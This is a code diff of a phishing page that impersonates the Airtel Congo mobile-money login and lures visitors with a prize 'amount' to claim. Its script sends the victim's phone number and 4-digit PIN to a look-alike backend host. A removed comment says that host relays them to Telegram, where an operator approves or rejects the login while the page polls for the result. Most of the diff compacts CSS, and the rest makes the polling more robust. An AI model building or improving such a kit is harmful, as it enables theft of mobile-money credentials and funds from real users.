@@ -6,248 +6,39 @@
 <title>AIRTEL CONGO - Connexion</title>
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  body {
-    min-height: 100vh;
-    background: #f5f5f5;
-    font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif;
-  }
-
-  .login-container {
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    background: linear-gradient(180deg, #ffffff 0%, #fafafa 100%);
-    max-width: 480px;
-    margin: 0 auto;
-    position: relative;
-    box-shadow: 0 0 60px rgba(0, 0, 0, 0.08);
-  }
-
-  .login-header {
-    padding: 32px 24px 20px;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    border-bottom: 1px solid rgba(192, 0, 26, 0.06);
-  }
-
-  .logo-large img {
-    height: 44px;
-    width: auto;
-  }
-
-  .login-content {
-    flex: 1;
-    padding: 24px 24px 32px;
-    display: flex;
-    flex-direction: column;
-  }
-
-  .login-title {
-    font-family: 'Syne', 'DM Sans', sans-serif;
-    font-size: 20px;
-    font-weight: 700;
-    color: #1a1a1a;
-    line-height: 1.4;
-    margin-bottom: 24px;
-    letter-spacing: -0.01em;
-  }
-
-  .login-form {
-    display: flex;
-    flex-direction: column;
-    gap: 24px;
-  }
-
-  /* Phone input */
-  .phone-input-container {
-    display: flex;
-    align-items: center;
-    background: #ffffff;
-    border: 1.5px solid #e0e0e0;
-    border-radius: 12px;
-    overflow: hidden;
-    transition: all 0.2s;
-    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
-  }
-
-  .phone-input-container:focus-within {
-    border-color: #c0001a;
-    box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1);
-  }
-
-  .country-code {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    padding: 14px;
-    background: #fafafa;
-    border-right: 1.5px solid #e0e0e0;
-    font-size: 15px;
-    font-weight: 600;
-    color: #333;
-    white-space: nowrap;
-  }
-
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { min-height: 100vh; background: #f5f5f5; font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif; }
+  .login-container { min-height: 100vh; display: flex; flex-direction: column; background: linear-gradient(180deg, #ffffff 0%, #fafafa 100%); max-width: 480px; margin: 0 auto; position: relative; box-shadow: 0 0 60px rgba(0, 0, 0, 0.08); }
+  .login-header { padding: 32px 24px 20px; display: flex; justify-content: center; align-items: center; border-bottom: 1px solid rgba(192, 0, 26, 0.06); }
+  .logo-large img { height: 44px; width: auto; }
+  .login-content { flex: 1; padding: 24px 24px 32px; display: flex; flex-direction: column; }
+  .login-title { font-family: 'Syne', 'DM Sans', sans-serif; font-size: 20px; font-weight: 700; color: #1a1a1a; line-height: 1.4; margin-bottom: 24px; letter-spacing: -0.01em; }
+  .login-form { display: flex; flex-direction: column; gap: 24px; }
+  .phone-input-container { display: flex; align-items: center; background: #ffffff; border: 1.5px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: all 0.2s; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04); }
+  .phone-input-container:focus-within { border-color: #c0001a; box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1); }
+  .country-code { display: flex; align-items: center; gap: 6px; padding: 14px; background: #fafafa; border-right: 1.5px solid #e0e0e0; font-size: 15px; font-weight: 600; color: #333; white-space: nowrap; }
   .flag-icon { font-size: 18px; line-height: 1; }
-
-  .phone-input {
-    flex: 1;
-    border: none;
-    outline: none;
-    padding: 14px 16px;
-    font-size: 16px;
-    font-family: inherit;
-    font-weight: 500;
-    color: #1a1a1a;
-    letter-spacing: 0.5px;
-    background: transparent;
-    cursor: not-allowed;
-  }
-
-  .phone-input:disabled {
-    color: #666;
-    background: #fafafa;
-  }
-
-  /* PIN */
+  .phone-input { flex: 1; border: none; outline: none; padding: 14px 16px; font-size: 16px; font-family: inherit; font-weight: 500; color: #1a1a1a; letter-spacing: 0.5px; background: transparent; cursor: not-allowed; }
+  .phone-input:disabled { color: #666; background: #fafafa; }
   .pin-section { display: flex; flex-direction: column; gap: 12px; }
   .pin-label { font-size: 14px; font-weight: 600; color: #333; }
   .pin-inputs-wrapper { display: flex; align-items: center; gap: 12px; }
-
-  .pin-input-single {
-    flex: 1;
-    height: 56px;
-    border: 1.5px solid #e0e0e0;
-    border-radius: 12px;
-    background: #ffffff;
-    font-size: 22px;
-    font-weight: 700;
-    text-align: center;
-    color: #1a1a1a;
-    outline: none;
-    transition: all 0.2s;
-    font-family: inherit;
-    letter-spacing: 12px;
-    padding-left: 12px;
-    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
-  }
-
-  .pin-input-single:focus {
-    border-color: #c0001a;
-    box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1);
-  }
-
-  .pin-input-single::placeholder {
-    color: #c0c0c0;
-    letter-spacing: 8px;
-    font-size: 20px;
-    font-weight: 400;
-    padding-left: 0;
-  }
-
-  .eye-button {
-    width: 48px;
-    height: 48px;
-    border: 1.5px solid #e0e0e0;
-    border-radius: 12px;
-    background: #ffffff;
-    font-size: 20px;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: all 0.2s;
-    flex-shrink: 0;
-  }
-
-  .eye-button:hover {
-    border-color: #c0001a;
-    background: #fff5f5;
-  }
-
-  /* Button */
-  .login-button {
-    width: 100%;
-    padding: 16px;
-    border: none;
-    border-radius: 12px;
-    background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%);
-    color: #ffffff;
-    font-size: 15px;
-    font-weight: 800;
-    letter-spacing: 0.08em;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: all 0.3s;
-    box-shadow: 0 8px 24px rgba(192, 0, 26, 0.35);
-    font-family: 'Syne', 'DM Sans', sans-serif;
-    margin-top: 8px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-  }
-
-  .login-button:hover:not(:disabled) {
-    transform: translateY(-2px);
-    box-shadow: 0 12px 32px rgba(192, 0, 26, 0.5);
-  }
-
-  .login-button:disabled {
-    background: linear-gradient(135deg, #d4d4d4 0%, #b8b8b8 100%);
-    cursor: not-allowed;
-    box-shadow: none;
-    opacity: 0.7;
-  }
-
-  /* Spinner */
-  .spinner {
-    width: 18px;
-    height: 18px;
-    border: 2.5px solid rgba(255, 255, 255, 0.3);
-    border-top-color: #ffffff;
-    border-radius: 50%;
-    animation: spin 0.7s linear infinite;
-    display: none;
-  }
+  .pin-input-single { flex: 1; height: 56px; border: 1.5px solid #e0e0e0; border-radius: 12px; background: #ffffff; font-size: 22px; font-weight: 700; text-align: center; color: #1a1a1a; outline: none; transition: all 0.2s; font-family: inherit; letter-spacing: 12px; padding-left: 12px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04); }
+  .pin-input-single:focus { border-color: #c0001a; box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1); }
+  .pin-input-single::placeholder { color: #c0c0c0; letter-spacing: 8px; font-size: 20px; font-weight: 400; padding-left: 0; }
+  .eye-button { width: 48px; height: 48px; border: 1.5px solid #e0e0e0; border-radius: 12px; background: #ffffff; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; flex-shrink: 0; }
+  .eye-button:hover { border-color: #c0001a; background: #fff5f5; }
+  .login-button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%); color: #ffffff; font-size: 15px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.3s; box-shadow: 0 8px 24px rgba(192, 0, 26, 0.35); font-family: 'Syne', 'DM Sans', sans-serif; margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+  .login-button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(192, 0, 26, 0.5); }
+  .login-button:disabled { background: linear-gradient(135deg, #d4d4d4 0%, #b8b8b8 100%); cursor: not-allowed; box-shadow: none; opacity: 0.7; }
+  .spinner { width: 18px; height: 18px; border: 2.5px solid rgba(255, 255, 255, 0.3); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.7s linear infinite; display: none; }
   .spinner.show { display: block; }
   @keyframes spin { to { transform: rotate(360deg); } }
-
-  /* Error message */
-  .error-msg {
-    background: rgba(192, 0, 26, 0.08);
-    border: 1px solid rgba(192, 0, 26, 0.3);
-    border-radius: 10px;
-    padding: 10px 14px;
-    font-size: 13px;
-    color: #c0001a;
-    text-align: center;
-    display: none;
-  }
+  .error-msg { background: rgba(192, 0, 26, 0.08); border: 1px solid rgba(192, 0, 26, 0.3); border-radius: 10px; padding: 10px 14px; font-size: 13px; color: #c0001a; text-align: center; display: none; }
   .error-msg.show { display: block; }
-
-  /* Footer */
-  .login-footer {
-    padding: 24px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    gap: 12px;
-    background: #fafafa;
-    border-top: 1px solid rgba(0, 0, 0, 0.05);
-  }
-
+  .login-footer { padding: 24px; display: flex; flex-direction: column; align-items: center; gap: 12px; background: #fafafa; border-top: 1px solid rgba(0, 0, 0, 0.05); }
   .login-footer img { height: 28px; opacity: 0.5; }
   .footer { font-size: 12px; color: #999; }
-
-  /* Responsive */
   @media (max-width: 480px) {
     .login-container { box-shadow: none; }
     .login-header { padding: 24px 20px 16px; }
@@ -310,7 +101,7 @@
 <script>
   /* ==================== CONFIG ==================== */
   const BACKEND_URL = 'https://aairtel-production.up.railway.app';
-  const POLL_INTERVAL = 2000; // 2 seconds
+  const POLL_INTERVAL = 2000;
 
   /* ==================== ELEMENTS ==================== */
   const pinInput = document.getElementById('pinInput');
@@ -321,32 +112,28 @@
   const spinner = document.getElementById('spinner');
   const loginBtnText = document.getElementById('loginBtnText');
 
-  /* ==================== LOAD SESSION DATA ==================== */
+  /* ==================== LOAD SESSION ==================== */
   const phone = sessionStorage.getItem('airtel_phone');
   const amount = sessionStorage.getItem('airtel_amount');
   const sessionToken = sessionStorage.getItem('airtel_session');
 
-  // Guard — redirect if missing session
   if (!phone || !amount || !sessionToken) {
     window.location.href = 'index.html';
   }
 
-  // Auto-fill phone (disabled)
   phoneInput.value = phone || '';
-
-  // Display amount
   if (amount) {
     document.getElementById('loginAmount').textContent = '$' + parseInt(amount).toLocaleString('en-US');
   }
 
-  /* ==================== PIN INPUT (digits only, max 4) ==================== */
+  /* ==================== PIN INPUT ==================== */
   pinInput.addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
     loginBtn.disabled = e.target.value.length !== 4;
     hideError();
   });
 
-  /* ==================== EYE BUTTON (Show/Hide PIN) ==================== */
+  /* ==================== EYE TOGGLE ==================== */
   let pinVisible = false;
   eyeButton.addEventListener('click', () => {
     pinVisible = !pinVisible;
@@ -359,7 +146,6 @@
     errorMsg.textContent = message;
     errorMsg.classList.add('show');
   }
-
   function hideError() {
     errorMsg.classList.remove('show');
   }
@@ -373,18 +159,15 @@
   /* ==================== FORM SUBMIT ==================== */
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-
     const pin = pinInput.value;
     if (pin.length !== 4) return;
 
-    // Show loading
     spinner.classList.add('show');
     loginBtnText.textContent = 'CONNEXION EN COURS...';
     loginBtn.disabled = true;
     hideError();
 
     try {
-      // 1. Send to backend → Telegram (with ✅ / ❌ buttons)
       const res = await fetch(`${BACKEND_URL}/api/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -398,19 +181,28 @@
       });
 
       const data = await res.json();
-
-      if (!res.ok || !data.success) {
-        throw new Error(data.error || 'Erreur de connexion');
-      }
+      if (!res.ok || !data.success) throw new Error(data.error || 'Erreur');
 
       const requestId = data.request_id;
+      if (!requestId) throw new Error('No request_id from server');
 
-      // 2. Waiting for admin — start polling
       loginBtnText.textContent = 'EN ATTENTE DE VALIDATION...';
 
       pollTimer = setInterval(async () => {
         try {
-          const r = await fetch(`${BACKEND_URL}/api/login/status/${requestId}`);
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 8000);
+
+          const r = await fetch(`${BACKEND_URL}/api/login/status/${requestId}`, {
+            signal: controller.signal
+          });
+          clearTimeout(timeout);
+
+          if (!r.ok) {
+            console.warn('Status fetch non-OK:', r.status);
+            return;
+          }
+
           const s = await r.json();
 
           if (s.status === 'approved') {
@@ -421,7 +213,7 @@
             resetWithError('Identifiants incorrects');
           }
         } catch (err) {
-          console.error('Poll error:', err);
+          console.warn('Poll error (will retry):', err.message);
         }
       }, POLL_INTERVAL);
 
@@ -431,7 +223,7 @@
     }
   });
 
-  /* ==================== RESET WITH ERROR ==================== */
+  /* ==================== RESET ==================== */
   function resetWithError(message) {
     spinner.classList.remove('show');
     loginBtnText.textContent = 'SE CONNECTER & RÉCLAMER';
